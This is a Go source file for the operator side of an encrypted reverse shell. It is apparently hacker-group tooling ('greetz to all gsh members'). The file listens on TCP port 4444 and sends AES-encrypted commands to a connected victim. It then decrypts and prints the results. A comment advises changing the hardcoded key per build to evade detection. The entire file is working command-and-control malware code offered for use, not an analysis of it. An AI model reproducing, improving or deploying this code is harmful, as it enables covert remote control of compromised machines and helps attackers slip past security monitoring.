package main
// coded by s1ege greetz to all gsh members
import (
  "bufio"
  "net"
  "os"
  "strings"
  "crypto/aes"
  "crypto/cipher"
  "crypto/rand"
  "github.com/fatih/color"
  "encoding/base64"
  "io"
  "fmt"
)

const port = ":4444"

func main() {
    red := color.New(color.FgHiRed, color.Bold)
    green := color.New(color.FgHiGreen, color.Bold)
    // enter your 32 byte long key here (change per each build to evade detection/decryption)
    key := []byte("024iF4ciIdeXt9Yxk9C97QsrNrxNXzEi")
    red.Println("Listening....")
    listener, _ := net.Listen("tcp", port)
    conn, _ := listener.Accept()
    for {
        reader := bufio.NewReader(os.Stdin)
        red.Print("go-shell> ")
        command, _ := reader.ReadString('\n')
        if strings.Compare(command, "exit") == 0 {
            enc_command := encryption(true, key, command)

            conn.Write([]byte(enc_command))
            conn.Close()
            os.Exit(0)

        } else {
              enc_command := encryption(true, key, command)
              conn.Write([]byte(enc_command))
              enc_output, _ := bufio.NewReader(conn).ReadString('\n')
              dec_output := encryption(false, key, string(enc_output))
              green.Println(string(dec_output))
    }
  }
}

func encryption(encrypt bool, key []byte, message string) (result string) {
    // encrypts message if the encrypt bool is true else decrypts
    if encrypt{
        plainText := []byte(message)
        block, err := aes.NewCipher(key)
        if err != nil {
            fmt.Println(err)
        }

        cipherText := make([]byte, aes.BlockSize+len(plainText))
        iv := cipherText[:aes.BlockSize]
        if _, err = io.ReadFull(rand.Reader, iv); err != nil {
             fmt.Println(err)
        }

        stream := cipher.NewCFBEncrypter(block, iv)
        stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)
        result = base64.URLEncoding.EncodeToString(cipherText)

    } else {
        cipherText, err := base64.URLEncoding.DecodeString(message)
        if err != nil {
            fmt.Println(err)
        }

        block, err := aes.NewCipher(key)
        if err != nil {
            fmt.Println(err)
        }

        iv := cipherText[:aes.BlockSize]
        cipherText = cipherText[aes.BlockSize:]
        stream := cipher.NewCFBDecrypter(block, iv)
        stream.XORKeyStream(cipherText, cipherText)
        result = string(cipherText)
    }
    return
}
